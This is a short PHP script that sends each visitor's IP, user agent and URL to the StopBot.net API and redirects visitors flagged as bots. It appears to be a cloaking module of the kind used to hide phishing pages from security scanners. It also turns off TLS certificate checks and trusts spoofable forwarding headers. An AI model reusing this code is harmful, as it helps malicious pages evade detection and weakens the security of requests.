<?php 
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");

// Set API key and redirection URL for bots
$config_stopbot['apikey'] = $api->stopbotkey();
$config_stopbot['bot']    = $api->ngeblock("error");

// Function to get the real client IP address, including support for Cloudflare
function get_client_ip() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    return $ip;
}

// Get the client IP address
$ip = get_client_ip();

// Initialize cURL session
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Prepare API request to StopBot.net with required parameters
curl_setopt($ch, CURLOPT_URL, "https://stopbot.net/api/blocker?apikey=" . $config_stopbot['apikey'] . "&ip=" . $ip . "&ua=" . urlencode($_SERVER['HTTP_USER_AGENT']) . "&url=" . urlencode($_SERVER['REQUEST_URI']));

// Execute the request
$data = curl_exec($ch);
curl_close($ch);

// Decode the JSON response
$json = json_decode($data, true);

// Get bot status from the response
$isBot = $json["IPStatus"]["isBot"];

// If the user is detected as a bot, log and block them
if ($isBot == 1) {
    $api->save($api->onetime, $_SESSION['ip'] . PHP_EOL, "a");
    $api->block("BLOCKED by STOPBOT");
    die(header("Location: " . $config_stopbot['bot']));
}
?>